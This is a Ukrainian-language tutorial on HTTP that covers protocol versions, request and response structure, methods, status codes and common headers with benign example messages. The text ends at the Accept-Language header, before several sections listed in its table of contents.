# 📘 Повний посібник з протоколу HTTP

## Зміст

1. [Вступ до HTTP](#вступ-до-http)
2. [Історія та еволюція HTTP](#історія-та-еволюція-http)
3. [Як працює HTTP: основи](#як-працює-http-основи)
4. [Архітектура клієнт-сервер](#архітектура-клієнт-сервер)
5. [Структура HTTP запиту](#структура-http-запиту)
6. [Структура HTTP відповіді](#структура-http-відповіді)
7. [HTTP методи детально](#http-методи-детально)
8. [HTTP статус коди](#http-статус-коди)
9. [HTTP заголовки](#http-заголовки)
10. [Cookies та управління сесіями](#cookies-та-управління-сесіями)
11. [Кешування в HTTP](#кешування-в-http)
12. [HTTPS та безпека](#https-та-безпека)
13. [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
14. [Content Negotiation](#content-negotiation)
15. [Compression (Стиснення даних)](#compression-стиснення-даних)
16. [HTTP/2: нове покоління](#http2-нове-покоління)
17. [HTTP/3: майбутнє протоколу](#http3-майбутнє-протоколу)
18. [Найкращі практики](#найкращі-практики)
19. [Поширені проблеми та їх рішення](#поширені-проблеми-та-їх-рішення)

---

## Вступ до HTTP

### Що таке HTTP?

**HTTP** (HyperText Transfer Protocol) — це **протокол передачі даних**, який використовується для обміну інформацією в Інтернеті. Це основа Всесвітньої павутини (World Wide Web).

**Простими словами:** HTTP — це мова, якою "розмовляють" браузери та веб-сервери. Коли ви відкриваєте веб-сайт, ваш браузер відправляє HTTP запит на сервер, а сервер відповідає HTTP відповіддю з потрібною інформацією.

### Ключові характеристики HTTP:

1. **Протокол прикладного рівня** — працює на 7-му рівні моделі OSI
2. **Клієнт-серверний протокол** — завжди є ініціатор (клієнт) та відповідач (сервер)
3. **Stateless (без збереження стану)** — кожен запит незалежний від попередніх
4. **Текстовий протокол** — людиночитабельний формат (в HTTP/1.x)
5. **Використовує TCP** — надійна передача даних

### Приклад простого HTTP запиту:

```http
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html
```

**Що тут відбувається?**

-   `GET` — метод запиту (хочемо отримати дані)
-   `/index.html` — ресурс, який запитуємо
-   `HTTP/1.1` — версія протоколу
-   `Host:`, `User-Agent:`, `Accept:` — додаткова інформація (заголовки)

---

## Історія та еволюція HTTP

### HTTP/0.9 (1991) — Початок

**Характеристики:**

-   Надзвичайно простий
-   Підтримував тільки метод GET
-   Не було заголовків
-   Тільки HTML документи

**Приклад:**

```http
GET /mypage.html
```

Відповідь:

```html
<html>
    Це проста сторінка
</html>
```

### HTTP/1.0 (1996) — Розширення

**Що нового:**

-   Додано HTTP заголовки (headers)
-   Нові методи: POST, HEAD
-   Статус коди відповіді
-   Можливість передавати різні типи контенту (зображення, відео, тощо)
-   Версія протоколу в запиті

**Приклад:**

```http
GET /image.jpg HTTP/1.0
Host: www.example.com
User-Agent: Mozilla/5.0

```

Відповідь:

```http
HTTP/1.0 200 OK
Content-Type: image/jpeg
Content-Length: 12345

[binary data]
```

**Проблема:** Кожен запит вимагав нового TCP з'єднання — неефективно!

### HTTP/1.1 (1997) — Стандартизація

**Ключові покращення:**

-   **Persistent connections** — одне з'єднання для багатьох запитів
-   **Pipelining** — можливість відправляти кілька запитів без очікування відповідей
-   **Chunked transfer encoding** — передача даних частинами
-   **Cache control** — кращий контроль кешування
-   **Обов'язковий заголовок Host** — дозволив Virtual Hosting

**Приклад Persistent Connection:**

```http
GET /page1.html HTTP/1.1
Host: example.com
Connection: keep-alive

GET /page2.html HTTP/1.1
Host: example.com
Connection: keep-alive

GET /page3.html HTTP/1.1
Host: example.com
Connection: close
```

### HTTP/2 (2015) — Революція

**Основні зміни:**

-   **Бінарний протокол** замість текстового
-   **Multiplexing** — паралельні запити в одному з'єднанні
-   **Server Push** — сервер може відправляти ресурси без запиту
-   **Header compression** — зменшення розміру заголовків
-   **Stream prioritization** — пріоритети для запитів

**Візуальне порівняння:**

HTTP/1.1:

```
Request1 -----> |========| Response1
Request2 -----> |========| Response2
Request3 -----> |========| Response3
```

HTTP/2:

```
Request1 --->
Request2 ---> |========| Response1, Response2, Response3 (паралельно)
Request3 --->
```

### HTTP/3 (2022) — Сучасність

**Революційна зміна:** Використовує **QUIC** замість TCP!

**Переваги:**

-   Швидше встановлення з'єднання
-   Краще працює при втраті пакетів
-   Вбудоване шифрування
-   Міграція з'єднань (зміна IP не розриває з'єднання)

---

## Як працює HTTP: основи

### Request-Response модель

HTTP працює за моделлю "запит-відповідь":

```
┌──────────┐                  ┌──────────┐
│  Клієнт  │ ────запит───────>│  Сервер  │
│ (браузер)│                  │          │
│          │ <───відповідь────│          │
└──────────┘                  └──────────┘
```

### Етапи HTTP комунікації:

#### 1. **DNS Lookup** (Пошук IP адреси)

```
example.com → 93.184.216.34
```

#### 2. **TCP Handshake** (Встановлення з'єднання)

```
Client: SYN →
        ← Server: SYN-ACK
Client: ACK →
```

#### 3. **TLS Handshake** (Для HTTPS)

```
Обмін сертифікатами та шифрування
```

#### 4. **HTTP Request** (Відправка запиту)

```http
GET /api/users HTTP/1.1
Host: api.example.com
```

#### 5. **Server Processing** (Обробка на сервері)

```
Сервер отримує запит → обробляє → готує відповідь
```

#### 6. **HTTP Response** (Відповідь сервера)

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"users": [...]}
```

### Stateless природа HTTP

**Що означає Stateless?**
Кожен HTTP запит — це повністю незалежна операція. Сервер "не пам'ятає" попередні запити.

**Проблема:**

```http
Запит 1: Логін користувача ✓
Запит 2: Отримати профіль — Хто ви? ❌
```

**Рішення:** Cookies, Sessions, Tokens

```http
Запит 1: Логін → відповідь містить Session ID
Запит 2: Отримати профіль + Session ID → Сервер знає, хто ви ✓
```

---

## Архітектура клієнт-сервер

### Ролі учасників

#### Клієнт (Client)

**Що це:** Програма, яка ініціює HTTP запити.

**Приклади:**

-   Веб-браузер (Chrome, Firefox, Safari)
-   Мобільний додаток
-   CLI інструмент (curl, wget)
-   Інший сервер (backend-to-backend)

**Обов'язки клієнта:**

-   Формування HTTP запиту
-   Відправка запиту
-   Отримання та обробка відповіді

#### Сервер (Server)

**Що це:** Програма, яка обробляє HTTP запити та надає відповіді.

**Приклади:**

-   Apache HTTP Server
-   Nginx
-   Node.js (Express)
-   Python (Django, Flask)
-   Java (Tomcat, Spring Boot)

**Обов'язки сервера:**

-   Прослуховування вхідних з'єднань
-   Парсинг HTTP запитів
-   Виконання бізнес-логіки
-   Формування HTTP відповіді

### Приклад взаємодії з curl:

```bash
# Клієнт відправляє GET запит
curl -v http://example.com

# Виведення:
> GET / HTTP/1.1
> Host: example.com
> User-Agent: curl/7.68.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Type: text/html
< Content-Length: 1256
<
<!doctype html>
<html>
...
</html>
```

---

## Структура HTTP запиту

HTTP запит складається з трьох основних частин:

```
Request Line
Headers (заголовки)
                    <- порожній рядок
Body (тіло, опціонально)
```

### 1. Request Line (Рядок запиту)

**Формат:**

```
МЕТОД /шлях/до/ресурсу HTTP/версія
```

**Приклад:**

```http
GET /api/users/123 HTTP/1.1
```

**Компоненти:**

-   **Метод** — що хочемо зробити (GET, POST, PUT, DELETE, тощо)
-   **URI** (Uniform Resource Identifier) — ресурс, до якого звертаємось
-   **Версія HTTP** — 1.1, 2, 3

### 2. Headers (Заголовки)

**Формат:**

```
Ім'я-Заголовка: значення
```

**Приклад:**

```http
Host: api.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json
Accept-Language: uk-UA,uk;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: sessionId=abc123xyz
```

**Основні типи заголовків:**

-   **General headers** — застосовні до запиту та відповіді
-   **Request headers** — специфічні для запиту
-   **Entity headers** — інформація про тіло повідомлення

### 3. Body (Тіло запиту)

**Коли використовується:** При відправці даних (POST, PUT, PATCH)

**Приклад з JSON:**

```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 58

{
  "name": "Олександр",
  "email": "oleksandr@example.com"
}
```

**Приклад з форм-даними:**

```http
POST /submit-form HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

name=Марія&email=maria@example.com
```

**Приклад з файлом (multipart):**

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

[binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

### Повний приклад HTTP запиту:

```http
POST /api/products HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json, text/plain, */*
Accept-Language: uk-UA,uk;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 87
Origin: https://shop.example.com
Referer: https://shop.example.com/add-product
Cookie: sessionId=xyz789; userId=12345
Connection: keep-alive

{
  "name": "Ноутбук",
  "price": 25000,
  "category": "electronics",
  "inStock": true
}
```

---

## Структура HTTP відповіді

HTTP відповідь також має три частини:

```
Status Line
Headers (заголовки)
                    <- порожній рядок
Body (тіло)
```

### 1. Status Line (Рядок статусу)

**Формат:**

```
HTTP/версія Статус-Код Пояснення
```

**Приклад:**

```http
HTTP/1.1 200 OK
```

**Компоненти:**

-   **Версія HTTP** — 1.1, 2, 3
-   **Статус код** — тризначне число (200, 404, 500, тощо)
-   **Reason Phrase** — текстове пояснення (OK, Not Found, тощо)

### 2. Response Headers (Заголовки відповіді)

**Приклад:**

```http
HTTP/1.1 200 OK
Date: Mon, 23 Dec 2024 10:30:00 GMT
Server: nginx/1.20.1
Content-Type: application/json; charset=utf-8
Content-Length: 348
Cache-Control: no-cache, no-store, must-revalidate
Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
```

### 3. Response Body (Тіло відповіді)

**Приклад з JSON:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "data": {
    "id": 123,
    "name": "Олександр",
    "email": "oleksandr@example.com"
  }
}
```

**Приклад з HTML:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
<head>
  <title>Головна сторінка</title>
</head>
<body>
  <h1>Ласкаво просимо!</h1>
</body>
</html>
```

**Приклад з помилкою:**

```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{
  "error": {
    "code": "NOT_FOUND",
    "message": "Користувача з ID 999 не знайдено",
    "timestamp": "2024-12-23T10:30:00Z"
  }
}
```

### Повний приклад HTTP відповіді:

```http
HTTP/1.1 201 Created
Date: Mon, 23 Dec 2024 10:35:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: application/json; charset=utf-8
Content-Length: 156
Location: /api/products/456
X-Request-ID: req_9876543210
Access-Control-Allow-Origin: *
Strict-Transport-Security: max-age=31536000
Connection: keep-alive

{
  "status": "success",
  "message": "Продукт успішно створено",
  "data": {
    "id": 456,
    "name": "Ноутбук",
    "price": 25000
  }
}
```

---

## HTTP методи детально

HTTP методи (або HTTP verbs) визначають, яку дію ми хочемо виконати з ресурсом.

### GET — Отримання даних

**Призначення:** Запит даних з сервера без зміни стану.

**Характеристики:**

-   ✅ Безпечний (Safe) — не змінює дані
-   ✅ Ідемпотентний (Idempotent) — повторні запити дають той самий результат
-   ✅ Кешується
-   ❌ Не має тіла запиту
-   ✅ Параметри в URL (query string)

**Приклад 1: Отримання списку:**

```http
GET /api/users HTTP/1.1
Host: api.example.com
Accept: application/json
```

Відповідь:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "users": [
    {"id": 1, "name": "Іван"},
    {"id": 2, "name": "Марія"}
  ]
}
```

**Приклад 2: Отримання конкретного ресурсу:**

```http
GET /api/users/1 HTTP/1.1
Host: api.example.com
```

Відповідь:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 1,
  "name": "Іван",
  "email": "ivan@example.com"
}
```

**Приклад 3: З параметрами:**

```http
GET /api/products?category=electronics&sort=price&limit=10 HTTP/1.1
Host: shop.example.com
```

**Коли використовувати:**

-   Отримання даних
-   Пошук
-   Фільтрація
-   Пагінація

---

### POST — Створення ресурсу

**Призначення:** Створення нового ресурсу або відправка даних для обробки.

**Характеристики:**

-   ❌ Не безпечний — змінює стан
-   ❌ Не ідемпотентний — кожен запит створює новий ресурс
-   ❌ Не кешується
-   ✅ Має тіло запиту
-   ✅ Дані в тілі запиту

**Приклад 1: Створення користувача:**

```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 78

{
  "name": "Петро",
  "email": "petro@example.com",
  "age": 28
}
```

Відповідь:

```http
HTTP/1.1 201 Created
Location: /api/users/3
Content-Type: application/json

{
  "id": 3,
  "name": "Петро",
  "email": "petro@example.com",
  "age": 28,
  "createdAt": "2024-12-23T10:40:00Z"
}
```

**Приклад 2: Відправка форми:**

```http
POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=Марія&email=maria@example.com&message=Привіт!
```

**Приклад 3: Завантаження файлу:**

```http
POST /api/upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----Boundary123

------Boundary123
Content-Disposition: form-data; name="file"; filename="document.pdf"
Content-Type: application/pdf

[binary data]
------Boundary123--
```

**Коли використовувати:**

-   Створення нового ресурсу
-   Відправка форм
-   Завантаження файлів
-   Виконання операцій, які змінюють стан

---

### PUT — Повне оновлення ресурсу

**Призначення:** Повна заміна існуючого ресурсу або створення, якщо не існує.

**Характеристики:**

-   ❌ Не безпечний — змінює стан
-   ✅ Ідемпотентний — повторні запити дають той самий результат
-   ❌ Не кешується
-   ✅ Має тіло запиту

**Приклад:**

```http
PUT /api/users/3 HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "name": "Петро Іванович",
  "email": "petro.new@example.com",
  "age": 29,
  "phone": "+380123456789"
}
```

Відповідь:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 3,
  "name": "Петро Іванович",
  "email": "petro.new@example.com",
  "age": 29,
  "phone": "+380123456789",
  "updatedAt": "2024-12-23T11:00:00Z"
}
```

**Різниця PUT vs POST:**

```
POST /api/users        → Створює НОВИЙ ресурс (ID генерується)
PUT /api/users/3       → Оновлює ІСНУЮЧИЙ ресурс з ID=3
```

---

### PATCH — Часткове оновлення

**Призначення:** Часткова модифікація ресурсу.

**Характеристики:**

-   ❌ Не безпечний
-   ⚠️ Може бути ідемпотентним (залежить від реалізації)
-   ❌ Не кешується
-   ✅ Має тіло запиту (тільки поля для оновлення)

**Приклад:**

```http
PATCH /api/users/3 HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "email": "petro.updated@example.com"
}
```

Відповідь:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 3,
  "name": "Петро Іванович",
  "email": "petro.updated@example.com",
  "age": 29,
  "phone": "+380123456789",
  "updatedAt": "2024-12-23T11:10:00Z"
}
```

**PUT vs PATCH:**

```http
PUT /api/users/3
{
  "name": "Новий",
  "email": "new@example.com",
  "age": 30
}
→ ПОВНА заміна (всі інші поля можуть бути скинуті)

PATCH /api/users/3
{
  "email": "new@example.com"
}
→ Тільки email змінено, інші поля залишаються
```

---

### DELETE — Видалення ресурсу

**Призначення:** Видалення ресурсу.

**Характеристики:**

-   ❌ Не безпечний
-   ✅ Ідемпотентний
-   ❌ Не кешується
-   ⚠️ Може мати тіло (але зазвичай немає)

**Приклад 1: Видалення ресурсу:**

```http
DELETE /api/users/3 HTTP/1.1
Host: api.example.com
```

Відповідь (успішно):

```http
HTTP/1.1 204 No Content
```

**Приклад 2: З підтвердженням:**

```http
DELETE /api/users/3 HTTP/1.1
Host: api.example.com
```

Відповідь:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Користувача успішно видалено",
  "deletedId": 3
}
```

**Приклад 3: Ресурс вже видалено:**

```http
DELETE /api/users/3 HTTP/1.1
Host: api.example.com
```

Відповідь:

```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{
  "error": "Користувача не знайдено"
}
```

---

### HEAD — Отримання заголовків

**Призначення:** Те саме що GET, але БЕЗ тіла відповіді (тільки заголовки).

**Характеристики:**

-   ✅ Безпечний
-   ✅ Ідемпотентний
-   ✅ Кешується
-   ❌ Відповідь без тіла

**Приклад:**

```http
HEAD /api/users/1 HTTP/1.1
Host: api.example.com
```

Відповідь:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 156
Last-Modified: Mon, 23 Dec 2024 09:00:00 GMT
ETag: "abc123"

```

**Використання:**

-   Перевірка існування ресурсу
-   Отримання метаданих (розмір, дата модифікації)
-   Перевірка перед завантаженням великого файлу

---

### OPTIONS — Доступні методи

**Призначення:** Отримання списку підтримуваних HTTP методів для ресурсу.

**Характеристики:**

-   ✅ Безпечний
-   ✅ Ідемпотентний

**Приклад:**

```http
OPTIONS /api/users HTTP/1.1
Host: api.example.com
```

Відповідь:

```http
HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

**Використання:**

-   CORS preflight запити
-   Визначення можливостей API

---

### CONNECT — Тунелювання

**Призначення:** Встановлення тунелю (зазвичай для HTTPS через проксі).

**Приклад:**

```http
CONNECT server.example.com:443 HTTP/1.1
Host: server.example.com:443
```

---

### TRACE — Діагностика

**Призначення:** Відображення отриманого запиту (для діагностики).

**Увага:** Зазвичай вимкнено з міркувань безпеки!

---

### Порівняльна таблиця методів:

| Метод   | Безпечний | Ідемпотентний | Кешується | Має Body | Призначення        |
| ------- | --------- | ------------- | --------- | -------- | ------------------ |
| GET     | ✅        | ✅            | ✅        | ❌       | Отримання          |
| POST    | ❌        | ❌            | ❌        | ✅       | Створення          |
| PUT     | ❌        | ✅            | ❌        | ✅       | Повне оновлення    |
| PATCH   | ❌        | ⚠️            | ❌        | ✅       | Часткове оновлення |
| DELETE  | ❌        | ✅            | ❌        | ⚠️       | Видалення          |
| HEAD    | ✅        | ✅            | ✅        | ❌       | Тільки заголовки   |
| OPTIONS | ✅        | ✅            | ❌        | ❌       | Доступні методи    |
| CONNECT | ❌        | ❌            | ❌        | ❌       | Тунель             |
| TRACE   | ✅        | ✅            | ❌        | ❌       | Діагностика        |

---

## HTTP статус коди

Статус коди — це тризначні числа, які вказують на результат обробки запиту.

### Структура статус коду:

```
XYZ
│└┴── Деталі (0-9)
└──── Категорія (1-5)
```

---

### 1xx — Інформаційні

**Значення:** Запит отримано, обробка триває.

#### 100 Continue

```http
HTTP/1.1 100 Continue
```

**Коли:** Клієнт відправив заголовок `Expect: 100-continue` і може продовжити.

**Приклад використання:**

```http
POST /upload HTTP/1.1
Host: example.com
Content-Length: 1073741824
Expect: 100-continue

[чекає на 100 Continue перед відправкою 1GB даних]
```

#### 101 Switching Protocols

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
```

**Коли:** Перехід на інший протокол (наприклад, WebSocket).

---

### 2xx — Успішні

**Значення:** Запит успішно оброблено.

#### 200 OK

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"message": "Успіх"}
```

**Найпоширеніший:** Все добре, ось ваші дані.

#### 201 Created

```http
HTTP/1.1 201 Created
Location: /api/users/123
Content-Type: application/json

{"id": 123, "name": "Новий користувач"}
```

**Коли:** Новий ресурс створено (POST).

#### 202 Accepted

```http
HTTP/1.1 202 Accepted
Content-Type: application/json

{
  "message": "Запит прийнято до обробки",
  "jobId": "job_789",
  "status": "pending"
}
```

**Коли:** Запит прийнято, але обробка не завершена (асинхронні операції).

#### 204 No Content

```http
HTTP/1.1 204 No Content
```

**Коли:** Успіх, але немає даних для повернення (DELETE, PUT).

#### 206 Partial Content

```http
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/2048
Content-Length: 1024

[частина даних]
```

**Коли:** Часткова передача даних (для великих файлів).

---

### 3xx — Перенаправлення

**Значення:** Потрібна додаткова дія для завершення запиту.

#### 301 Moved Permanently

```http
HTTP/1.1 301 Moved Permanently
Location: https://new-site.com/page
```

**Коли:** Ресурс НАЗАВЖДИ переїхав. Браузери кешують це!

**Приклад використання:**

```
Старий сайт: http://old-site.com
        ↓ 301
Новий сайт: https://new-site.com
```

#### 302 Found (Temporary Redirect)

```http
HTTP/1.1 302 Found
Location: /temporary-page
```

**Коли:** ТИМЧАСОВЕ перенаправлення. Не кешується.

#### 304 Not Modified

```http
HTTP/1.1 304 Not Modified
ETag: "abc123"
Cache-Control: max-age=3600
```

**Коли:** Ресурс не змінився, використовуйте кеш.

**Приклад:**

```http
Запит:
GET /style.css HTTP/1.1
If-None-Match: "abc123"

Відповідь:
HTTP/1.1 304 Not Modified
→ Браузер використовує закешовану версію
```

#### 307 Temporary Redirect

```http
HTTP/1.1 307 Temporary Redirect
Location: /other-page
```

**Різниця від 302:** Метод запиту ЗБЕРІГАЄТЬСЯ (POST залишається POST).

#### 308 Permanent Redirect

```http
HTTP/1.1 308 Permanent Redirect
Location: https://new-domain.com/resource
```

**Різниця від 301:** Метод запиту ЗБЕРІГАЄТЬСЯ.

---

### 4xx — Помилки клієнта

**Значення:** Клієнт надіслав неправильний запит.

#### 400 Bad Request

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{
  "error": "Invalid JSON format",
  "details": "Unexpected token at line 5"
}
```

**Коли:** Синтаксична помилка в запиті.

#### 401 Unauthorized

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="API"
Content-Type: application/json

{
  "error": "Authentication required",
  "message": "Токен відсутній або невалідний"
}
```

**Коли:** Потрібна аутентифікація (логін).

**Примітка:** Назва вводить в оману! Правильніше було б "Unauthenticated".

#### 403 Forbidden

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{
  "error": "Access denied",
  "message": "У вас немає прав для видалення цього ресурсу"
}
```

**Коли:** Ви аутентифіковані, але не авторизовані для цієї дії.

**401 vs 403:**

```
401: Хто ви? (не залогінені)
403: Я знаю хто ви, але вам не можна (недостатньо прав)
```

#### 404 Not Found

```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{
  "error": "Resource not found",
  "message": "Користувача з ID 999 не існує"
}
```

**Коли:** Ресурс не знайдено.

#### 405 Method Not Allowed

```http
HTTP/1.1 405 Method Not Allowed
Allow: GET, POST
Content-Type: application/json

{
  "error": "Method DELETE not allowed for this resource"
}
```

**Коли:** HTTP метод не підтримується для цього ресурсу.

#### 408 Request Timeout

```http
HTTP/1.1 408 Request Timeout
Content-Type: application/json

{
  "error": "Request timeout",
  "message": "Клієнт не відправив запит протягом 30 секунд"
}
```

**Коли:** Клієнт занадто довго відправляв запит.

#### 409 Conflict

```http
HTTP/1.1 409 Conflict
Content-Type: application/json

{
  "error": "Conflict",
  "message": "Користувач з таким email вже існує",
  "conflictingField": "email"
}
```

**Коли:** Конфлікт із поточним станом ресурсу.

#### 410 Gone

```http
HTTP/1.1 410 Gone
Content-Type: application/json

{
  "error": "Resource permanently deleted",
  "message": "Цей ресурс було видалено і не буде відновлено"
}
```

**Коли:** Ресурс назавжди видалено (на відміну від 404).

#### 413 Payload Too Large

```http
HTTP/1.1 413 Payload Too Large
Content-Type: application/json

{
  "error": "File too large",
  "message": "Максимальний розмір файлу: 10MB",
  "receivedSize": "25MB"
}
```

**Коли:** Тіло запиту занадто велике.

#### 415 Unsupported Media Type

```http
HTTP/1.1 415 Unsupported Media Type
Content-Type: application/json

{
  "error": "Unsupported media type",
  "message": "Очікується application/json, отримано text/plain",
  "acceptedTypes": ["application/json", "application/xml"]
}
```

**Коли:** Формат даних не підтримується.

#### 429 Too Many Requests

```http
HTTP/1.1 429 Too Many Requests
Retry-After: 60
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1703332800
Content-Type: application/json

{
  "error": "Rate limit exceeded",
  "message": "Ви перевищили ліміт 100 запитів на годину",
  "retryAfter": 60
}
```

**Коли:** Перевищено ліміт запитів (rate limiting).

---

### 5xx — Помилки сервера

**Значення:** Сервер не зміг обробити правильний запит.

#### 500 Internal Server Error

```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{
  "error": "Internal server error",
  "message": "Щось пішло не так на сервері",
  "errorId": "err_abc123xyz"
}
```

**Коли:** Загальна помилка сервера.

#### 501 Not Implemented

```http
HTTP/1.1 501 Not Implemented
Content-Type: application/json

{
  "error": "Method not implemented",
  "message": "Метод PATCH ще не реалізовано для цього ресурсу"
}
```

**Коли:** Сервер не підтримує необхідну функціональність.

#### 502 Bad Gateway

```http
HTTP/1.1 502 Bad Gateway
Content-Type: application/json

{
  "error": "Bad gateway",
  "message": "Upstream сервер повернув невалідну відповідь"
}
```

**Коли:** Проксі-сервер отримав невалідну відповідь від upstream сервера.

#### 503 Service Unavailable

```http
HTTP/1.1 503 Service Unavailable
Retry-After: 120
Content-Type: application/json

{
  "error": "Service temporarily unavailable",
  "message": "Сервіс на технічному обслуговуванні",
  "estimatedDowntime": "120 seconds"
}
```

**Коли:** Сервіс тимчасово недоступний (обслуговування, перевантаження).

#### 504 Gateway Timeout

```http
HTTP/1.1 504 Gateway Timeout
Content-Type: application/json

{
  "error": "Gateway timeout",
  "message": "Upstream сервер не відповів вчасно"
}
```

**Коли:** Проксі-сервер не отримав відповідь вчасно.

---

### Вибір правильного статус коду:

```
Ресурс не знайдено → 404
Немає прав доступу → 403
Не залогінений → 401
Валідація не пройшла → 400 або 422
Дублікат → 409
Створено → 201
Оновлено → 200 або 204
Видалено → 204
Помилка сервера → 500
```

---

## HTTP заголовки

Заголовки (headers) — це метадані, які передають додаткову інформацію про запит або відповідь.

### Формат заголовків:

```
Назва-Заголовка: значення
```

**Правила:**

-   Case-insensitive (регістр не важливий): `Content-Type` = `content-type`
-   Один заголовок на рядок
-   Значення можуть містити кому для множинних значень

---

### General Headers (Загальні)

Застосовні до запиту ТА відповіді.

#### Date

```http
Date: Mon, 23 Dec 2024 12:00:00 GMT
```

**Призначення:** Дата та час створення повідомлення.

#### Connection

```http
Connection: keep-alive
```

або

```http
Connection: close
```

**Призначення:** Керування з'єднанням.

-   `keep-alive` — зберегти з'єднання для наступних запитів
-   `close` — закрити після відповіді

#### Cache-Control

```http
Cache-Control: no-cache, no-store, must-revalidate
```

```http
Cache-Control: public, max-age=3600
```

**Призначення:** Директиви кешування.

**Основні значення:**

-   `no-cache` — перевіряти з сервером перед використанням кешу
-   `no-store` — не кешувати взагалі
-   `public` — можна кешувати всюди
-   `private` — тільки браузер може кешувати
-   `max-age=3600` — кеш валідний 3600 секунд (1 година)
-   `must-revalidate` — перевіряти після закінчення max-age

---

### Request Headers (Заголовки запиту)

#### Host (ОБОВ'ЯЗКОВИЙ!)

```http
Host: www.example.com
```

або з портом:

```http
Host: api.example.com:8080
```

**Призначення:** Доменне ім'я сервера (необхідний для Virtual Hosting).

**Virtual Hosting (віртуальний хостинг)** — це технологія, яка дозволяє одному серверу обслуговувати **кілька веб-сайтів** (доменів) одночасно, **на одній IP-адресі**.

### Навіщо це потрібно?

Уяви, що ти маєш лише один сервер або IP, але хочеш запускати одразу кілька сайтів, наприклад:

-   `www.example.com`
-   `shop.example.com`
-   `anotherdomain.net`

Завдяки virtual hosting, сервер може "зрозуміти", до якого саме сайту звертається користувач, навіть якщо всі домени "падають" на одну й ту ж IP-адресу.

---

### Як це працює?

Браузер при надсиланні HTTP-запиту додає заголовок:

```
Host: www.example.com
```

Сервер читає цей заголовок і **на його основі вирішує**, який сайт віддати у відповідь.

---

### Типи Virtual Hosting:

1. **Name-based (іменний)** — один IP, багато доменів, вибір сайту відбувається за значенням заголовка `Host`. **Найпоширеніший варіант.**

2. **IP-based** — кожен сайт має **окрему IP-адресу**. Менш популярний через брак IPv4-адрес.

---

### Приклад (Name-based):

У конфігурації веб-сервера (наприклад, Apache або Nginx) прописуються окремі блоки:

```
<VirtualHost *:80>
    ServerName www.example.com
    DocumentRoot /var/www/example
</VirtualHost>

<VirtualHost *:80>
    ServerName www.another.com
    DocumentRoot /var/www/another
</VirtualHost>
```

Сервер дивиться на `Host:` у запиті й віддає відповідний сайт.

---

### Підсумок:

**Virtual Hosting** дозволяє розміщувати багато сайтів на одному сервері, використовуючи заголовок `Host` для визначення, який сайт показати. Це зручно, економно і широко використовується в хостингу.

#### User-Agent

```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
```

**Призначення:** Інформація про клієнта (браузер, ОС).

**Приклади:**

```http
# Chrome на Windows
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

# Safari на iPhone
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1

# curl
User-Agent: curl/7.68.0
```

#### Accept

```http
Accept: application/json
```

```http
Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
```

**Призначення:** Типи контенту, які клієнт може обробити.

**Quality values (q):**

```http
Accept: text/html;q=1.0, application/json;q=0.8, text/plain;q=0.5
```

-   `q=1.0` — найвищий пріоритет
-   `q=0.8` — середній
-   `q=0.5` — низький

#### Accept-Language

```http
Accept-Language: uk-UA, uk;q=0.9, en;q=0.8, ru;q=0.7
```

